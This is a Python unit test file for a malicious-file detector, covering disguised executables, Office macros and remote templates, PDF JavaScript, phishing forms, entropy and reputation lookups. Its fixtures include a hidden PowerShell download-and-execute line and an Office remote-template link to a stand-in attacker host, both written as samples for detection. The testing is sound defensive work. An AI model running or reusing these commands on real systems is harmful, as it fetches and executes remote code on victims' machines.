import os
import tempfile
import unittest
import zipfile
from unittest import mock

from common.net import Deadline
from common.scoring import compute_score
from detectors import file as fd
from tests import helpers

UNKNOWN_VT = helpers.vt(ok=False)


def analyze(data, filename, vt_res=None, mb_res=None, av=None):
    fd_, path = tempfile.mkstemp()
    with os.fdopen(fd_, 'wb') as fh:
        fh.write(data)
    try:
        with mock.patch('detectors.file.vt_lookup_file', return_value=vt_res or UNKNOWN_VT), \
                mock.patch('detectors.file.malwarebazaar_check', return_value=mb_res or helpers.OK_CLEAN), \
                mock.patch('detectors.file.run_clamav', return_value=av or {'status': 'SKIPPED', 'infected': False}):
            a = fd.analyze_file(path, filename, Deadline(20))
    finally:
        os.remove(path)
    s = compute_score(a.findings, reputation_ok=a.reputation_ok)
    return a, s, {f.code for f in a.findings}


def make_zip(entries):
    fd_, path = tempfile.mkstemp(suffix='.zip')
    os.close(fd_)
    with zipfile.ZipFile(path, 'w') as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    with open(path, 'rb') as fh:
        blob = fh.read()
    os.remove(path)
    return blob


class FilenameTests(unittest.TestCase):
    def codes(self, name):
        return {f.code for f in fd.filename_findings(name)}

    def test_double_extension_only_for_doc_like_inner(self):
        self.assertIn('DOUBLE_EXTENSION', self.codes('invoice.pdf.exe'))
        self.assertIn('DOUBLE_EXTENSION', self.codes('anh.jpg.scr'))
        self.assertNotIn('DOUBLE_EXTENSION', self.codes('my.report.v2.exe'))   # trước đây bị báo oan
        self.assertEqual(self.codes('report.pdf'), set())

    def test_rlo(self):
        self.assertIn('RLO_FILENAME', self.codes('invoice\u202egpj.exe'))

    def test_high_risk_ext(self):
        for n in ('a.exe', 'a.vbs', 'a.ps1', 'a.lnk', 'a.iso'):
            self.assertIn('HIGH_RISK_EXT', self.codes(n))


class MagicTests(unittest.TestCase):
    def test_detect(self):
        d = fd.detect_magic
        self.assertEqual(d(b'MZ\x90', b'MZ\x90'), 'PE')
        self.assertEqual(d(b'%PDF-1.7', b'%PDF-1.7'), 'PDF')
        self.assertEqual(d(b'PK\x03\x04', b'PK\x03\x04'), 'ZIP')
        self.assertEqual(d(b'\x89PNG', b'\x89PNG'), 'PNG')
        self.assertEqual(d(b'<!DOCTYPE', b'  <!DOCTYPE html><html>'), 'HTML')
        self.assertEqual(d(b'hello', b'hello'), 'UNKNOWN')

    def test_exe_disguised_as_pdf(self):
        a, s, got = analyze(b'MZ' + b'\x90' * 400, 'invoice.pdf')
        self.assertIn('EXEC_DISGUISED', got)
        self.assertEqual(a.details['detected_format'], 'Windows_PE_Executable')

    def test_html_disguised_as_pdf(self):
        _, _, got = analyze(b'<html><body>login</body></html>', 'invoice.pdf')
        self.assertIn('MAGIC_MISMATCH', got)

    def test_exe_with_txt_extension(self):
        _, _, got = analyze(b'MZ' + b'\x00' * 100, 'readme.txt')
        self.assertIn('EXEC_DISGUISED', got)

    def test_real_pdf_and_png_are_clean(self):
        _, s, got = analyze(b'%PDF-1.4\n1 0 obj<< /Type /Catalog /OpenAction [3 0 R /Fit] >>endobj', 'a.pdf')
        self.assertEqual(got, set())
        _, _, got = analyze(b'\x89PNG\r\n\x1a\n' + b'\x00' * 50, 'a.png')
        self.assertEqual(got, set())


class FormatTests(unittest.TestCase):
    def test_office_macro_zip(self):
        blob = make_zip({'[Content_Types].xml': '<x/>', 'word/vbaProject.bin': b'\x00VBA'})
        a, s, got = analyze(blob, 'bao_gia.docm')
        self.assertIn('OFFICE_MACRO', got)

    def test_remote_template_injection(self):
        rels = ('<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
                '2006/relationships/attachedTemplate" Target="http://evil.example.net/t.dotm" '
                'TargetMode="External"/></Relationships>')
        blob = make_zip({'word/_rels/settings.xml.rels': rels, '[Content_Types].xml': '<x/>'})
        _, _, got = analyze(blob, 'hop_dong.docx')
        self.assertIn('OFFICE_REMOTE_TEMPLATE', got)

    def test_normal_hyperlink_not_flagged(self):
        rels = ('<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
                '2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/></Relationships>')
        blob = make_zip({'word/_rels/document.xml.rels': rels})
        _, _, got = analyze(blob, 'a.docx')
        self.assertNotIn('OFFICE_REMOTE_TEMPLATE', got)

    def test_legacy_ole_macro(self):
        data = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1' + b'\x00' * 3000 + '_VBA_PROJECT'.encode('utf-16-le') + b'\x00' * 100
        _, _, got = analyze(data, 'cu.doc')
        self.assertIn('OFFICE_MACRO', got)

    def test_zip_with_executable_inside(self):
        blob = make_zip({'hoa_don.pdf.exe': b'MZ', 'readme.txt': 'x'})
        a, s, got = analyze(blob, 'hoa_don.zip')
        self.assertIn('ARCHIVE_CONTAINS_EXECUTABLE', got)
        self.assertIn('hoa_don.pdf.exe', a.details['archive']['executables'])

    def test_office_doc_not_flagged_for_embedded_files(self):
        blob = make_zip({'word/document.xml': '<w/>', 'word/embeddings/x.bin': b'1'})
        _, _, got = analyze(blob, 'a.docx')
        self.assertEqual(got, set())

    def test_corrupt_zip_does_not_crash(self):
        _, _, got = analyze(b'PK\x03\x04' + b'garbage' * 50, 'a.zip')
        self.assertNotIn('ARCHIVE_CONTAINS_EXECUTABLE', got)

    def test_pdf_javascript(self):
        _, _, got = analyze(b'%PDF-1.7\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>', 'a.pdf')
        self.assertIn('PDF_ACTIVE_CONTENT', got)

    def test_html_password_form(self):
        html = b'<html><form action="x"><input type="password" name="p"></form></html>'
        _, s, got = analyze(html, 'xac_minh.html')
        self.assertIn('HTML_CREDENTIAL_FORM', got)

    def test_yara_lite_powershell(self):
        script = b'powershell -nop -w hidden -enc SQBFAFgA; IEX (New-Object Net.WebClient).DownloadString("http://x")'
        a, s, got = analyze(script, 'update.ps1')
        self.assertIn('YARA_MATCH', got)
        self.assertGreaterEqual(len(a.details['matched_yara_rules']), 2)
        self.assertEqual(s.risk_level, 'DANGEROUS')

    def test_yara_lite_utf16_script(self):
        script = 'powershell -w hidden -enc AAAA'.encode('utf-16-le')
        _, _, got = analyze(script, 'x.ps1')
        self.assertIn('YARA_MATCH', got)

    def test_benign_powershell_word_no_match(self):
        _, _, got = analyze(b'Tai lieu huong dan su dung powershell cho nguoi moi', 'huongdan.txt')
        self.assertNotIn('YARA_MATCH', got)

    def test_entropy_only_flagged_for_risky_types(self):
        rnd = os.urandom(200_000)
        _, _, got = analyze(b'MZ' + rnd, 'setup.exe')
        self.assertIn('HIGH_ENTROPY', got)
        _, _, got = analyze(b'\xff\xd8\xff' + rnd, 'photo.jpg')   # ảnh nén có entropy cao là bình thường
        self.assertNotIn('HIGH_ENTROPY', got)

    def test_entropy_function(self):
        self.assertEqual(fd.calculate_entropy({}, 0), 0.0)
        self.assertAlmostEqual(fd.calculate_entropy({0: 5, 1: 5}, 10), 1.0)


class ReputationTests(unittest.TestCase):
    def test_virustotal_detections(self):
        a, s, got = analyze(b'hello world file', 'a.txt', vt_res=helpers.vt(malicious=7))
        self.assertEqual(s.score, 0)
        self.assertIn('FILE_VT_MALICIOUS', got)

    def test_malwarebazaar_hit(self):
        mb = {'source': 'malwarebazaar', 'ok': True, 'status': 'MALWARE_FOUND', 'signature': 'AgentTesla',
              'malicious': 1, 'suspicious': 0}
        _, s, _ = analyze(b'x' * 50, 'a.bin', mb_res=mb)
        self.assertEqual(s.score, 0)

    def test_clamav_infected(self):
        _, s, _ = analyze(b'x' * 50, 'a.bin', av={'status': 'INFECTED', 'infected': True, 'signature': 'Eicar-Test'})
        self.assertEqual(s.score, 0)

    def test_unknown_hash_everywhere_is_low_confidence_not_safe_claim(self):
        unavailable = {'source': 'malwarebazaar', 'ok': False, 'status': 'NO_API_KEY', 'malicious': 0, 'suspicious': 0}
        a, s, _ = analyze(b'plain text', 'a.txt', mb_res=unavailable)
        self.assertEqual(s.confidence, 'LOW')

    def test_source_exception_does_not_crash(self):
        fd_, path = tempfile.mkstemp()
        os.write(fd_, b'abc'); os.close(fd_)
        try:
            with mock.patch('detectors.file.vt_lookup_file', side_effect=RuntimeError), \
                    mock.patch('detectors.file.malwarebazaar_check', return_value=helpers.OK_CLEAN), \
                    mock.patch('detectors.file.run_clamav', return_value={'status': 'SKIPPED', 'infected': False}):
                a = fd.analyze_file(path, 'a.txt', Deadline(10))
        finally:
            os.remove(path)
        self.assertEqual(a.details['virustotal_report']['status'], 'ERROR')

    def test_hashes_correct(self):
        a, _, _ = analyze(b'abc', 'a.txt')
        self.assertEqual(a.details['sha256'], 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')
        self.assertEqual(a.details['md5'], '900150983cd24fb0d6963f7d28e17f72')

    def test_large_file_entropy_is_fast(self):
        import time
        data = os.urandom(10 * 1024 * 1024)
        t = time.time()
        analyze(data, 'big.bin')
        self.assertLess(time.time() - t, 8)


if __name__ == '__main__':
    unittest.main()
